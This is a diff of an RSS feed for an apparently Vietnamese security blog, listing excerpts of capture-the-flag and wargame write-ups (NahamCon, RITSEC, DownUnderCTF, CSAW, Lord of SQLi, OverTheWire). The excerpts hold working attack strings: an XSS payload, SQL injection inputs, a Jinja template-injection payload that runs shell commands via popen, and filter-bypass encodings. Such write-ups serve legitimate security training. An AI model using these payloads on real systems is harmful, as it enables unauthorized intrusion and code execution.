@@ -3,55 +3,80 @@
   <channel>
     <title>D@rkmod3</title>
     <link>/</link>
-    <description>Recent content on D@rkmod3</description>
+    <description></description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 28 Sep 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Overthewire</title>
-      <link>/posts/overthewire/</link>
-      <pubDate>Tue, 28 Sep 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/overthewire/</guid>
-      <description>Bandit Level 0 Use ls command, we get a file readme. Use cat command to read it.
-cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1 When use ls it returns only -, I use cat - but it not works because:
+    <lastBuildDate>Mon, 02 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Nahamcon CTF2022</title>
+        <link>/posts/nahamconctf2022/</link>
+        <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/nahamconctf2022/</guid>
+        <description>Hacker Ts (hard) Bài này cho chúng ta input text và sử dụng wkhtmltoimage để generate ra hình ảnh.
+Thử với htmlinjection:
+/exploit?text=&amp;lt;del%20style=&amp;#34;color:red&amp;#34;&amp;gt;test&amp;lt;/del&amp;gt;&amp;amp;color=%2324d600 Thử xss 1 chút:
+/exploit?text=&amp;lt;del%20id=&amp;#34;test&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;test&amp;lt;/del&amp;gt;&amp;lt;script&amp;gt;test.innerText=&amp;#34;changethistext&amp;#34;&amp;lt;/script&amp;gt;&amp;amp;color=%2324d600 Yah, chữ test đã chuyển thành changethistext, chứng tỏ thẻ &amp;lt;script&amp;gt; hoạt động. Nice!!!, như vậy ta ta chỉ cần lấy dữ liệu từ /admin là có được flag. Payload
+&amp;lt;script&amp;gt;var result = document.createElement(&amp;#34;p&amp;#34;);var data = new XMLHttpRequest();data.</description>
+      </item>
+    
+      <item>
+        <title>RitsecCTF 2022</title>
+        <link>/posts/ritsecctf_2022/</link>
+        <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/ritsecctf_2022/</guid>
+        <description>Really Cool Encryption Bài này cho phép chúng ta nhập vào 1 input bất kì và in ra base64 encode của input đó.
+ Fuzzing SSTI {{7*7}}, {% if ... %}, ... và nhận thấy rằng chall không có vuln ssti.
+Fuzzing 1 lúc, mình nhận ra nếu input chứa dấu “(” hoặc “)” thì sẽ không in ra gì cả.
+Mình quyết định bruteforce các kí tự printable để xem hành vi xử lí của input.</description>
+      </item>
+    
+      <item>
+        <title>Overthewire</title>
+        <link>/posts/overthewire/</link>
+        <pubDate>Tue, 28 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/overthewire/</guid>
+        <description>Bandit  Level 0 Use ls command, we get a file readme. Use cat command to read it.
+cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1  Level 1 When use ls it returns only -, I use cat - but it not works because:
  &amp;quot;-&amp;quot; means to read the argument/content from STDIN (file descriptor 0)  So I use ./- to select this file.
-bandit1@bandit:~$ file ./- ./-: ASCII text bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 2 It uses spaces in this filename, but don&amp;rsquo;t worry because we can use * to select all file from this directory</description>
-    </item>
+bandit1@bandit:~$ file ./- ./-: ASCII text  bandit1@bandit:~$ cat .</description>
+      </item>
     
-    <item>
-      <title>DownUnderCTF2021</title>
-      <link>/posts/downunderctf/</link>
-      <pubDate>Sun, 26 Sep 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/downunderctf/</guid>
-      <description>Web (7/11) My team ends up at 11th place all over 2142 teams, that is a proud achievement right? FarSight  Difficult: easy  Login to this page, notice to the burp proxy history, i found a route /graphql.
+      <item>
+        <title>DownUnderCTF2021</title>
+        <link>/posts/downunderctf/</link>
+        <pubDate>Sun, 26 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/downunderctf/</guid>
+        <description>Web (7/11)  My team ends up at 11th place all over 2142 teams, that is a proud achievement right? FarSight  Difficult: easy  Login to this page, notice to the burp proxy history, i found a route /graphql.
 I use a tool named GraphQL Playground to analysis scheme and execute query command.
-type ConfigPair { key: String! value: String! } type Mutation { loginOrRegister(username: String!, password: String!): String newPage(name: String, content: String, siteId: ID!</description>
-    </item>
+type ConfigPair {  key: String!  value: String! }  type Mutation {  loginOrRegister(username: String!</description>
+      </item>
     
-    <item>
-      <title>Lord of Sqli</title>
-      <link>/posts/lord_of_sqli/</link>
-      <pubDate>Wed, 15 Sep 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/lord_of_sqli/</guid>
-      <description>Day 1  Grimlin cobolt goblin orc  Grimlin To win this game, we force $result[&#39;id&#39;] return any value.
-$query = &amp;#34;select id from prob_gremlin where id=&amp;#39;{$_GET[id]}&amp;#39; and pw=&amp;#39;{$_GET[pw]}&amp;#39;&amp;#34;; I use &#39; to escape id param and add a sql command:
-id=&amp;#39;or(1)--+- # ... where id=&amp;#39;&amp;#39; or(1)-- +-and pw= id=1&amp;#39; union select &amp;#39;vietcaijvaodaycungduoc&amp;#39; --+- # try with union, huh! # ... many ways Cobolt Same with Grimlin we must do some trick to force $result[&#39;id&#39;] = &#39;admin&#39;</description>
-    </item>
+      <item>
+        <title>Lord of Sqli</title>
+        <link>/posts/lord_of_sqli/</link>
+        <pubDate>Wed, 15 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/lord_of_sqli/</guid>
+        <description>Day 1  Grimlin cobolt goblin orc   Grimlin To win this game, we force $result[&#39;id&#39;] return any value.
+ $query = &amp;#34;select id from prob_gremlin where id=&amp;#39;{$_GET[id]}&amp;#39; and pw=&amp;#39;{$_GET[pw]}&amp;#39;&amp;#34;; I use &#39; to escape id param and add a sql command:
+ id=&amp;#39;or(1)--+-  # ... where id=&amp;#39;&amp;#39; or(1)-- +-and pw=  id=1&amp;#39; union select &amp;#39;vietcaijvaodaycungduoc&amp;#39; --+-  # try with union, huh!  # ... many ways  Cobolt Same with Grimlin we must do some trick to force $result[&#39;id&#39;] = &#39;admin&#39;</description>
+      </item>
     
-    <item>
-      <title>CSAW - 2021</title>
-      <link>/posts/csaw/</link>
-      <pubDate>Tue, 14 Sep 2021 13:13:43 +0700</pubDate>
-      
-      <guid>/posts/csaw/</guid>
-      <description>Ninja Type: SSTI I test value param with {{7*7}} and it returns 49.
+      <item>
+        <title>CSAW - 2021</title>
+        <link>/posts/csaw/</link>
+        <pubDate>Tue, 14 Sep 2021 13:13:43 +0700</pubDate>
+        
+        <guid>/posts/csaw/</guid>
+        <description>Ninja Type: SSTI I test value param with {{7*7}} and it returns 49.
 http://web.chal.csaw.io:5000/submit?value={{7*7}} Okay, RCE timeeeeee~
 {{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls -la&amp;#39;).read()}} This payload import class os and executes ls -la from popen. Send this payload and we get the response:
 Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base It&amp;rsquo;s not hard to bypass this filters
  With _ we can bypass by \x5f (hex encode) With os we can bypass by \x6f\x73 With .</description>
-    </item>
+      </item>
     
   </channel>
 </rss>
